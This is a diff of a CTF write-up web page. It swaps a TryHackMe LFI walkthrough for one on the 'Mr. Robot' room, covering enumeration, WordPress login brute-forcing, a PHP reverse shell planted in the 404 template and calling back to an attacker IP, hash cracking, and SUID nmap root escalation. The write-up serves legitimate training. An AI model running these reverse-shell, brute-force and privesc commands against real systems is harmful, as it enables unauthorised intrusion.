@@ -3,13 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Lo-Fi | JackHacksStuff</title>
+<title>Mr. Robot | JackHacksStuff</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --accent:     #00ff88;
-    --accent-rgb: 0,255,136;
+    --accent:     #ff6b35;
+    --accent-rgb: 255,107,53;
     --bg:       #090b0e;
     --surface:  #0e1116;
     --surface2: #131820;
@@ -46,7 +46,6 @@
     z-index: 9999;
   }
 
-  /* ── Layout ── */
   .rail {
     position: fixed;
     top: 0; left: 0;
@@ -108,7 +107,6 @@
 
   main { margin-left: var(--rail); }
 
-  /* ── Nav ── */
   nav {
     position: sticky;
     top: 0; z-index: 90;
@@ -152,7 +150,6 @@
     color: var(--accent);
   }
 
-  /* ── Write-up header ── */
   .wu-header {
     padding: 5rem 3rem 3.5rem;
     border-bottom: 1px solid var(--border);
@@ -228,7 +225,6 @@
 
   .wu-meta-value.accent { color: var(--accent); }
 
-  /* ── Tool tags ── */
   .tool-row {
     display: flex;
     gap: 0.4rem;
@@ -246,14 +242,11 @@
     padding: 0.2rem 0.5rem;
   }
 
-  /* ── Body ── */
   .wu-body {
     max-width: calc(var(--content) + 6rem);
     padding: 4rem 3rem;
     margin: 0 auto;
   }
-
-  /* ── Typography components ── */
 
   .wu-body h2 {
     font-family: var(--mono);
@@ -294,7 +287,6 @@
     border: 1px solid var(--border);
   }
 
-  /* ── Lists ── */
   .wu-body ol, .wu-body ul {
     font-size: 0.82rem;
     color: var(--muted2);
@@ -320,7 +312,6 @@
     border: 1px solid var(--border);
   }
 
-  /* Code block */
   .wu-body pre {
     background: var(--surface);
     border-left: 2px solid var(--accent);
@@ -340,7 +331,6 @@
     font-size: inherit;
   }
 
-  /* Flag box */
   .flag-box {
     background: var(--surface);
     border: 1px solid var(--accent);
@@ -408,7 +398,34 @@
 
   .note strong { color: #9fb8ff; font-weight: 500; }
 
-  /* ── Footer ── */
+  figure {
+    margin: 1.5rem 0;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+  }
+
+  figure img {
+    width: 100%;
+    display: block;
+  }
+
+  figcaption {
+    padding: 0.5rem 1rem;
+    font-size: 0.7rem;
+    color: var(--muted);
+    background: var(--surface);
+    border-top: 1px solid var(--border);
+  }
+
+  figcaption code {
+    background: var(--bg);
+    color: var(--accent);
+    padding: 0.1em 0.35em;
+    font-size: 0.85em;
+    border: 1px solid var(--border);
+  }
+
   .wu-footer {
     border-top: 1px solid var(--border);
     margin: 0 3rem;
@@ -478,20 +495,22 @@
     <div class="rail-line"></div>
     <div class="rail-tick active" data-heading="overview"></div>
     <div class="rail-line"></div>
-    <div class="rail-tick" data-heading="background"></div>
-    <div class="rail-line"></div>
     <div class="rail-tick" data-heading="recon"></div>
     <div class="rail-line"></div>
-    <div class="rail-tick" data-heading="enumeration"></div>
+    <div class="rail-tick" data-heading="web-enum"></div>
     <div class="rail-line"></div>
-    <div class="rail-tick" data-heading="exploitation"></div>
+    <div class="rail-tick" data-heading="wordpress"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="shell"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="privesc"></div>
     <div class="rail-line"></div>
     <div class="rail-tick" data-heading="flags"></div>
     <div class="rail-line"></div>
     <div class="rail-tick" data-heading="takeaways"></div>
     <div class="rail-line"></div>
   </div>
-  <div class="rail-bottom">Easy</div>
+  <div class="rail-bottom">Medium</div>
 </div>
 
 <main>
@@ -499,25 +518,25 @@
     <a href="../writeups.html" class="nav-back">← Write-ups</a>
     <div class="nav-meta">
       <span>TryHackMe</span>
-      <span class="nav-badge">Easy</span>
+      <span class="nav-badge">Medium</span>
     </div>
   </nav>
 
   <div class="wu-header">
-    <div class="wu-eyebrow">// TryHackMe · web exploitation</div>
-    <h1 class="wu-title">Lo-Fi</h1>
+    <div class="wu-eyebrow">// TryHackMe · web exploitation · privilege escalation</div>
+    <h1 class="wu-title">Mr. Robot</h1>
     <div class="wu-meta-row">
       <div class="wu-meta-item">
         <span class="wu-meta-label">Date</span>
-        <span class="wu-meta-value">2026-07-11</span>
+        <span class="wu-meta-value">2026-07-20</span>
       </div>
       <div class="wu-meta-item">
         <span class="wu-meta-label">Difficulty</span>
-        <span class="wu-meta-value accent">Easy</span>
+        <span class="wu-meta-value accent">Medium</span>
       </div>
       <div class="wu-meta-item">
         <span class="wu-meta-label">Flags</span>
-        <span class="wu-meta-value">1</span>
+        <span class="wu-meta-value">3</span>
       </div>
       <div class="wu-meta-item">
         <span class="wu-meta-label">Platform</span>
@@ -527,124 +546,249 @@
   </div>
 
   <div class="tool-row">
-    <span class="tool-tag">LFI</span>
-    <span class="tool-tag">path traversal</span>
-    <span class="tool-tag">proc filesystem</span>
+    <span class="tool-tag">nmap</span>
+    <span class="tool-tag">gobuster</span>
+    <span class="tool-tag">wpscan</span>
+    <span class="tool-tag">WordPress</span>
+    <span class="tool-tag">reverse shell</span>
+    <span class="tool-tag">John the Ripper</span>
+    <span class="tool-tag">SUID</span>
+    <span class="tool-tag">nmap privesc</span>
   </div>
 
   <div class="wu-body">
 
     <h2 id="overview">// Overview</h2>
     <p>
-      Lo-Fi is a TryHackMe room that shows a classic <strong>Local File Inclusion (LFI)</strong>
-      vulnerability. The goal is simple: go to the provided URL and find the flag in the
-      root of the filesystem.
+      <strong>Mr. Robot</strong> is a classic TryHackMe room inspired by the TV series. It offers a great challenge for beginners and intermediate users. This CTF tests web enumeration, WordPress exploitation, hash cracking, and Linux privilege escalation. The room is rated <strong>Medium</strong> and provides a strong introduction to the penetration testing process.
     </p>
     <p>
-      Though the room is rated "Easy," it teaches an important lesson about <strong>improper input
-      sanitization</strong>. This bug still affects web applications today.
+      The room includes:
     </p>
+    <ul>
+      <li>Web enumeration and directory brute-forcing</li>
+      <li>WordPress admin access through credential brute-forcing</li>
+      <li>Reverse shell using WordPress theme editing</li>
+      <li>MD5 hash cracking with John the Ripper</li>
+      <li>SUID binary exploitation for root access</li>
+    </ul>
 
-    <h2 id="vulnerability">// The Vulnerability: LFI via ?page=</h2>
+    <h2 id="recon">// Phase 1: Reconnaissance</h2>
+
+    <p>We start with a standard Nmap scan. The <code>-sC</code> flag runs default scripts, <code>-sV</code> detects versions, and the <code>-p-</code> flag scans all 65,535 ports.</p>
+
+    <pre>nmap -sC -sV -p- &lt;target_ip&gt;</pre>
+
+    <p>Three ports are open:</p>
+
+    <pre>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu
+80/tcp  open  http     Apache httpd
+443/tcp open  ssl/http Apache httpd</pre>
+
+    <p>Visiting the website on port 80 reveals a cool interactive page themed after the Mr. Robot show. The page doesn't give away any information right away, so we need to dig deeper.</p>
+
+    <p>We run <code>gobuster</code> to find hidden directories:</p>
+
+    <pre>gobuster dir -u http://&lt;target_ip&gt; -w /usr/share/wordlists/dirb/common.txt</pre>
+
+    <p>The scan reveals several interesting directories. Among them, we find:</p>
+
+    <pre>/robots               (Status: 200)
+/wp-admin             (Status: 301)
+/wp-login             (Status: 200)
+/wp-content           (Status: 301)</pre>
+
+    <div class="note">
+      <strong>Pro Tip:</strong> Always check <code>robots.txt</code> early. It often has hidden paths or files that the developer doesn't want search engines to index, but they can be useful for us.
+    </div>
+
+    <h2 id="web-enum">// Phase 2: Discovering the Wordlist</h2>
 
     <p>
-      Visiting the provided URL shows a straightforward music-themed page. Looking at the page source
-      uncovers an important clue in the sidebar:
+      Accessing <code>http://&lt;target_ip&gt;/robots.txt</code> reveals:
     </p>
 
-    <pre>&lt;!-- Sidebar Widgets Column --&gt;
-&lt;div class="card my-4"&gt;
-  &lt;h5 class="card-header"&gt;Discography&lt;/h5&gt;
-  &lt;div class="card-body"&gt;
-    &lt;ul class="list-unstyled mb-0"&gt;
-      &lt;li&gt;&lt;a href="/?page=relax.php"&gt;Relax&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href="/?page=sleep.php"&gt;Sleep&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href="/?page=chill.php"&gt;Chill&lt;/a&gt;&lt;/li&gt;    
-      &lt;li&gt;&lt;a href="/?page=coffee.php"&gt;Coffee&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href="/?page=vibe.php"&gt;Vibe&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href="/?page=game.php"&gt;Game&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/div&gt;
-&lt;/div&gt;</pre>
+    <pre>User-agent: *
+fsocity.dic
+key-1-of-3.txt</pre>
 
-    <p>
-      This <code>?page=</code> parameter is a classic sign of <strong>Local File Inclusion (LFI)</strong>.
-      The application probably uses PHP's <code>include()</code> function without
-      proper sanitization.
-    </p>
+    <p>There are two files listed. The <code>fsocity.dic</code> file is a large wordlist, and <code>key-1-of-3.txt</code> contains the first flag.</p>
 
-    <p>
-      Testing the parameter with <code>../../../../etc/passwd</code> confirms the vulnerability:
-    </p>
-
-    <!-- Screenshot 1: /etc/passwd -->
-    <figure style="margin: 1.5rem 0; border: 1px solid var(--border); border-radius: 4px; overflow: hidden;">
-      <img src="images/lofi/02-etc-passwd.png" alt="Browser output showing the contents of /etc/passwd" style="width: 100%; display: block;">
-      <figcaption style="padding: 0.5rem 1rem; font-size: 0.7rem; color: var(--muted); background: var(--surface); border-top: 1px solid var(--border);">
-        <em>Figure 1: The <code>/etc/passwd</code> file, LFI confirmed.</em>
-      </figcaption>
-    </figure>
-
-    <p>
-      Interestingly, trying to read <code>/flag.txt</code> directly does not work, which indicates a basic
-      filter for absolute paths. However, using <strong>relative traversal with <code>../</code></strong>
-      completely bypasses this check.
-    </p>
-
-    <h2 id="exploitation">// Exploitation: Reading the Flag</h2>
-
-    <p>
-      Since relative traversal works, we navigate up from the web root to read <code>/flag.txt</code>.
-    </p>
-
-    <!-- Screenshot 2: The Flag (Redacted) -->
-    <figure style="margin: 1.5rem 0; border: 1px solid var(--border); border-radius: 4px; overflow: hidden;">
-      <img src="images/lofi/03-flag.png" alt="Browser output showing the redacted flag" style="width: 100%; display: block;">
-      <figcaption style="padding: 0.5rem 1rem; font-size: 0.7rem; color: var(--muted); background: var(--surface); border-top: 1px solid var(--border);">
-        <em>Figure 2: The flag, redacted for this public write-up.</em>
-      </figcaption>
-    </figure>
-
-    <h2 id="flags">// Flags</h2>
+    <p>We grab the first key:</p>
 
     <div class="flag-box">
-      <span class="flag-label">Flag — LFI Discovery</span>
-      <span class="flag-value">flag{e447...}</span>
+      <span class="flag-label">Key 1</span>
+      <span class="flag-value">0734...</span>
+    </div>
+
+    <p>
+      The wordlist <code>fsocity.dic</code> will be useful later. We download it:
+    </p>
+
+    <pre>wget http://&lt;target_ip&gt;/fsocity.dic</pre>
+
+    <h2 id="wordpress">// Phase 3: WordPress Enumeration</h2>
+
+    <p>We found <code>/wp-login</code> during enumeration, which is a WordPress login page. WordPress has a useful feature: it explains <strong>why</strong> the login failed.</p>
+
+    <div class="note">
+      <strong>WordPress Error Messages:</strong>
+      <ul>
+        <li><code>"Invalid username"</code> means the username doesn't exist</li>
+        <li><code>"Invalid password"</code> means the username exists, but the password is wrong.</li>
+      </ul>
+      This is a common information disclosure vulnerability.
+    </div>
+
+    <p>We used <strong>Hydra</strong> to list valid usernames with the <code>fsocity.dic</code> wordlist:</p>
+
+    <pre>hydra -L fsocity.dic -p anything 10.113.143.152 http-post-form \
+"/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username"</pre>
+
+    <p>Hydra quickly found the username: <strong>Elliot</strong> WordPress is case-insensitive, so variations like "elliot" and "ELLIOT" also work.</p>
+
+    <p>For the password brute-force, we switched to <strong>wpscan</strong>:</p>
+
+    <pre>wpscan --url http://10.113.143.152 -U Elliot -P fsocity.dic</pre>
+
+    <div class="note">
+      <strong>Why wpscan?</strong> WordPress's XML-RPC API allows <code>system.multicall</code>, which tests multiple passwords in a single request. This made wpscan much faster, taking about 47 minutes vs. Hydra's roughly 5.5 hours.
+    </div>
+
+    <p>The scan found the password:</p>
+
+    <pre>[SUCCESS] - Elliot / ER28-0652</pre>
+
+    <h2 id="shell">// Phase 4: Getting a Reverse Shell</h2>
+
+    <p>With the credentials <code>Elliot / ER28-0652</code>, we log in to the WordPress admin panel at <code>http://&lt;target_ip&gt;/wp-admin</code>.
+    </p>
+
+    <p>In the WordPress admin, we go to:</p>
+
+    <ul>
+      <li><strong>Appearance → Editor</strong></li>
+      <li>Select the <strong>404 Template</strong> (<code>404.php</code>) from the right sidebar.</li>
+    </ul>
+
+    <p>We replace the entire content of <code>404.php</code> with a PHP reverse shell. The PentestMonkey one-liner works well:</p>
+
+    <pre>&lt;?php
+set_time_limit(0);
+$ip = '&lt;attacker_ip&gt;';
+$port = 4444;
+$ch = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_connect($ch, $ip, $port);
+exec("/bin/sh -i <&3 >&3 2>&3");
+?&gt;</pre>
+
+    <p>Before saving, we set up a netcat listener on our attacker machine:</p>
+
+    <pre>nc -lvnp 4444</pre>
+
+    <p>To trigger the shell, we visit a non-existent page on the site, which forces it to load the 404 template:</p>
+
+    <pre>curl http://&lt;target_ip&gt;/blah</pre>
+
+    <p>The connection is caught, and we have a shell as the <code>daemon</code> user.</p>
+
+    <div class="takeaway">
+      <strong>404 Template Injection:</strong> WordPress's theme editor is a common attack point. If you have admin access, you can change any theme file, including error pages, to run arbitrary code.
+    </div>
+
+    <h2 id="privesc">// Phase 5: Privilege Escalation</h2>
+
+    <p>We now have a shell as <code>daemon</code>. We need to become <code>robot</code> to read the second flag.</p>
+
+    <p>First, we check the <code>/home/robot</code> directory:</p>
+
+    <pre>ls -la /home/robot</pre>
+
+    <p>We find a file named <code>password.raw-md5</code> that contains an MD5 hash:</p>
+
+    <pre>cat /home/robot/password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b</pre>
+
+    <p>Next, we copy the hash to a file and use John the Ripper to crack it:</p>
+
+    <pre>john --format=Raw-MD5 robot_hash.txt --wordlist=fsocity.dic</pre>
+
+    <p>The password is cracked as: <code>abcdefghijklmnopqrstuvwxyz</code></p>
+
+    <p>Now, we switch to the <code>robot</code> user:
+    </p>
+
+    <pre>su robot
+Password: abcdefghijklmnopqrstuvwxyz</pre>
+
+    <p>We read the second flag:</p>
+
+    <div class="flag-box">
+      <span class="flag-label">Key 2</span>
+      <span class="flag-value">822c...</span>
+    </div>
+
+    <p>Next, we need root access. We check for SUID binaries:</p>
+
+    <pre>find / -perm -4000 -type f 2>/dev/null</pre>
+
+    <p>One binary stands out: <code>/usr/local/bin/nmap</code>. This is an older version of Nmap that has a known vulnerability.</p>
+
+    <p>We run Nmap in interactive mode and spawn a shell:</p>
+
+    <pre>/usr/local/bin/nmap --interactive
+map> !sh</pre>
+
+    <p>This gives us a root shell. We read the final flag:</p>
+
+    <pre>cd /root
+cat key-3-of-3.txt</pre>
+
+    <div class="flag-box">
+      <span class="flag-label">Key 3</span>
+      <span class="flag-value">0478...</span>
+    </div>
+
+    <div class="takeaway">
+      <strong>SUID Binaries:</strong> The <code>nmap --interactive</code> privilege escalation is a classic CTF technique. Older versions of Nmap (pre-5.0) had this vulnerability. Always check for SUID binaries and research any that seem out of date.
     </div>
 
     <h2 id="takeaways">// Key Takeaways</h2>
 
     <div class="takeaway">
-      <strong>Always check the page source first.</strong> The vulnerability was visible
-      in plain HTML; no directory enumeration was needed. This is a reminder to begin with
-      the simplest reconnaissance.
+      <strong>Wordlists serve multiple purposes.</strong> The <code>fsocity.dic</code> file acted as both a username list and a password list. Always think about how you might repurpose a wordlist.
     </div>
 
     <div class="takeaway">
-      <strong>Absolute path filters are easy to bypass.</strong> The application checked
-      for a slash at the start, but <code>../</code> sequences got around it completely.
-      This is a common mistake in input sanitization.
+      <strong>Patience is important.</strong> The 47-minute wpscan brute force teaches persistence. In pentesting, you must use your time effectively.
     </div>
 
     <div class="takeaway">
-      <strong>LFI is more than just a file reader.</strong> While this room only required reading
-      a file, LFI vulnerabilities can often be combined with other techniques, like log poisoning,
-      to enable remote code execution. This makes them an important finding in any assessment.
+      <strong>WordPress is often targeted.</strong> The theme editor is a common attack point. Knowing how to manage WordPress is key for testing web applications.
+    </div>
+
+    <div class="takeaway">
+      <strong>SUID binaries hold a lot of power.</strong> Always run <code>find / -perm -4000 -type f 2>/dev/null</code> on Linux machines. You never know which outdated binary might give you root access.
+    </div>
+
+    <div class="takeaway">
+      <strong>Dodge, duck, dip, dive, and... dodge?</strong> This room is a great way to learn the classic CTF approach: enumerate, exploit, escalate, and document.
     </div>
 
   </div>
 
   <div class="wu-footer">
-    <a href="dodge.html" class="footer-nav-link prev">
+    <a href="lofi.html" class="footer-nav-link prev">
       <span class="footer-nav-label">← Previous</span>
-      <span class="footer-nav-title">Dodge</span>
+      <span class="footer-nav-title">Lo-Fi</span>
     </a>
     <div class="footer-center">
       <a href="../writeups.html">All write-ups</a>
     </div>
-    <a href="mister-robot.html" class="footer-nav-link next">
+    <a href="w1seguy.html" class="footer-nav-link next">
       <span class="footer-nav-label">Next →</span>
-      <span class="footer-nav-title">Mr. Robot</span>
+      <span class="footer-nav-title">W1seGuy</span>
     </a>
   </div>
 
